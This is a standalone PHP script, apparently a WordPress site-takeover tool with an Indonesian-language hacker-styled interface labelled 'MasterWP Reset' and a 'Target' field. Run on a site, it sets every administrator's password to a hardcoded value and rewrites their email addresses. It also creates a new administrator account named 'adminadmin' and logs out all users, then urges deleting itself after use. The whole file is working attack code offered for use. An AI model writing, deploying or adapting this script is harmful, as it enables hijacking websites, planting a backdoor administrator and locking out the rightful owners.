<?php
require_once('wp-load.php');

$new_password = "b2hunters@2026";
$new_admin_username = "adminadmin";
$domain = isset($_SERVER['HTTP_HOST']) && !empty($_SERVER['HTTP_HOST'])
    ? $_SERVER['HTTP_HOST']
    : basename(dirname(dirname(dirname(dirname(__FILE__)))));
$new_admin_email = "admin@" . $domain;

$admin_users = get_users(['role' => 'administrator']);
$total = count($admin_users);
$updated = 0;
?>
<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'>
<title>MasterWP — Admin Reset</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0f0f0f; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 40px; min-height: 100vh; }
  .container { max-width: 700px; margin: 0 auto; }
  .header { border-left: 4px solid #00ff88; padding-left: 16px; margin-bottom: 30px; }
  .header h1 { font-size: 22px; color: #00ff88; letter-spacing: 2px; text-transform: uppercase; }
  .header p { font-size: 12px; color: #555; margin-top: 4px; }
  .info-box { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 6px; padding: 16px 20px; margin-bottom: 24px; }
  .info-box span { color: #888; font-size: 12px; }
  .info-box code { color: #00ccff; font-size: 13px; }
  .section-title { font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; }
  .user-list { list-style: none; margin-bottom: 24px; }
  .user-list li { display: flex; align-items: center; gap: 12px; padding: 10px 16px; background: #1a1a1a; border-radius: 4px; margin-bottom: 6px; border-left: 3px solid #00ff88; font-size: 13px; }
  .user-list li .username { color: #fff; font-weight: bold; }
  .user-list li .id { color: #555; font-size: 11px; }
  .user-list li .email { color: #00ccff; font-size: 11px; margin-left: auto; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
  .badge.ok { background: #003322; color: #00ff88; }
  .badge.warn { background: #332200; color: #ffaa00; }
  .badge.err { background: #330000; color: #ff4444; }
  .summary { background: #1a1a1a; border-radius: 6px; padding: 16px 20px; margin-bottom: 16px; display: flex; align-items: center; gap: 12px; }
  .summary .count { font-size: 32px; font-weight: bold; color: #00ff88; }
  .summary .label { color: #888; font-size: 12px; }
  .warning { background: #1a0000; border: 1px solid #440000; border-radius: 6px; padding: 12px 16px; font-size: 12px; color: #ff4444; margin-top: 24px; }
  .dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; display: inline-block; margin-right: 6px; animation: blink 1s infinite; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>⚡ MasterWP Reset</h1>
    <p><span class="dot"></span>Target: <code><?= $domain ?></code> &mdash; <?= date('Y-m-d H:i:s') ?></p>
  </div>

  <div class="info-box">
    <span>Password Baru &nbsp;</span><code><?= $new_password ?></code><br><br>
    <span>Email Format &nbsp;</span><code>username@<?= $domain ?></code>
  </div>

  <p class="section-title">Proses Update Administrator</p>
  <ul class="user-list">
<?php
foreach ($admin_users as $user) {
    $new_email = $user->user_login . '@' . $domain;
    wp_set_password($new_password, $user->ID);
    wp_update_user(['ID' => $user->ID, 'user_email' => $new_email]);
    echo "<li>
        <span class='badge ok'>✓ updated</span>
        <span class='username'>{$user->user_login}</span>
        <span class='id'>ID: {$user->ID}</span>
        <span class='email'>{$new_email}</span>
    </li>";
    $updated++;
}
?>
  </ul>

  <div class="summary">
    <div class="count"><?= $updated ?>/<?= $total ?></div>
    <div class="label">Admin berhasil<br>diperbarui</div>
  </div>

<?php
if (!username_exists($new_admin_username)) {
    $user_id = wp_create_user($new_admin_username, $new_password, $new_admin_email);
    if (!is_wp_error($user_id)) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        echo "<br><p><span class='badge ok'>✓ created</span> &nbsp;User <strong style='color:#fff'>$new_admin_username</strong> berhasil dibuat.</p>";
    }
} else {
    echo "<br><p><span class='badge warn'>⚠ exists</span> &nbsp;User <strong style='color:#fff'>$new_admin_username</strong> sudah ada.</p>";
}

if (class_exists('WP_Session_Tokens')) {
    WP_Session_Tokens::destroy_all_for_all_users();
    echo "<br><p><span class='badge ok'>✓ cleared</span> &nbsp;Semua sesi login telah dihapus.</p>";
}
?>

  <div class="warning">⚠ PERINGATAN: Hapus file ini segera setelah digunakan!</div>
</div>
</body>
</html>